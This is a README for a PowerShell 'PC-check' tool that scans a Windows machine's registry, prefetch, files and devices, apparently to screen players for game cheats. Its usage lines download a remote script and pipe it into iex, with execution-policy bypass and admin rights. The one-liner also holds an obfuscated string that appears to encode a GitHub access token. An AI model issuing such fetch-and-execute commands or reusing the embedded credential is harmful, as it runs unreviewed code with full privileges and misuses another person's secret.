# 🟣 Fiori's PC-Check Tool

> A stylized PowerShell-based system audit tool with animated black & purple UI.  
> Made by **@suprsor / Fiori** on Discord.

---

## ✨ Features

- 🎨 **Black & purple animated UI** — spinner animations, progress bars, colored output
- 🗂️ **Registry scan** — checks BAM, AppCompat, MuiCache for execution traces
- 🪟 **Windows info** — OS version, install date, Secure Boot, Firewall, Real-Time Protection
- 🌐 **Browser detection** — lists all installed browsers from the registry
- 🎮 **R6 Siege usernames** — finds local profile folders and opens stats.cc for each
- 📂 **File scanner** — scans Downloads, Desktop, AppData, OneDrive for `.exe`, `.rar`, `.cfg`, `.tlscan`
- 🔍 **Suspicious name detection** — flags files matching patterns like `loader`, `inject`, `hack`, `cheat`
- ⚡ **Prefetch history** — lists recently executed programs from `C:\Windows\Prefetch`
- 🖥️ **Device Manager** — logs Display, HID, Net, USB, Mouse, Port devices with VID/PID
- 🔌 **PCIe & USB enumeration** — full PnP device list with vendor/device IDs
- 🖱️ **Logitech GHUB scripts** — detects any scripts in the LGHUB scripts folder
- 📋 **Auto clipboard** — log is copied to clipboard when scan finishes
- 💾 **Log file** — results saved to `Desktop\PcCheckLogs.txt`

---

## 🚀 Usage

### One-liner (Recommended)
```powershell
$t="Z2l0aHViX3BhdF8xMUJMQjMzVVEwbkVzOHhJeVBpUnpoX2g3RUhSaTB0YkN5cWphV1lOTFBXWWE4WkZSb1RxeU5JSG1CcjU5UVRQV3ZGSzVSRUNCQVFpWTJVT05w"; iwr -useb https://raw.githubusercontent.com/suprsor/Pc-Checker-Main/refs/heads/main/SuprsorsPcCheck.ps1 | iex
```

### Alternative — Save & Run
```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
iwr -useb https://raw.githubusercontent.com/suprsor/Pc-Checker-Main/refs/heads/main/SuprsorsPcCheck.ps1 -OutFile "$env:TEMP\PcCheck.ps1"
& "$env:TEMP\PcCheck.ps1"
```

> ⚠️ Run as **Administrator** for full access to registry hives, prefetch, and device data.

---

## 📁 Output

| Location | Contents |
|---|---|
| `Desktop\PcCheckLogs.txt` | Full scan log saved to disk |
| Clipboard | Log is auto-copied when scan completes |

---

## 🎨 UI Color Guide

| Color | Meaning |
|---|---|
| 🟣 Purple/Magenta | Section headers, decorative elements |
| ⚪ White/Gray | Normal entries |
| 🟡 Yellow | Recently modified / recently executed (last 48h) |
| 🔴 Red | Suspicious filename match |
| 🟢 Green | Clean / security features enabled |
| 🔵 Cyan | System info values |

---

## 📋 Requirements

- Windows 10 / 11
- PowerShell 5.1 or later
- Administrator privileges (recommended)
- Internet connection (to download the script)

---

## 📂 What Gets Scanned

```
Registry Keys:
  HKLM\SYSTEM\...\bam\State\UserSettings
  HKCU\SOFTWARE\...\AppCompatFlags\...
  HKCU\SOFTWARE\...\FeatureUsage\AppSwitched
  HKCR\Local Settings\...\MuiCache

File Paths:
  %USERPROFILE%\Downloads
  %USERPROFILE%\Desktop
  %APPDATA%
  %LOCALAPPDATA%
  OneDrive folder (if detected)

System:
  C:\Windows\Prefetch\*.pf
  Win32_PnPEntity (PCIe + USB)
  PnpDevice (Display, HID, Net, USB, Mouse, Ports)
  C:\Users\<user>\AppData\Local\LGHUB\scripts
```
